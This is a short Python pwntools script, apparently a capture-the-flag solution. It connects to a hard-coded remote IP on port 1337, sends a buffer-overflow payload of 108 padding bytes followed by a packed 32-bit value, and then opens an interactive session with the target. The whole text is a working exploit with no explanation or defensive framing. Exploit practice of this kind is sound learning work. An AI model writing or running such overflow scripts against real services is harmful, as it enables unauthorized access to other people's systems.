from pwn import *


r = remote('68.183.87.88', 1337)
print r.recv()


shellcode = 'A'*108 + p32(21)

r.sendline(shellcode)
r.interactive()
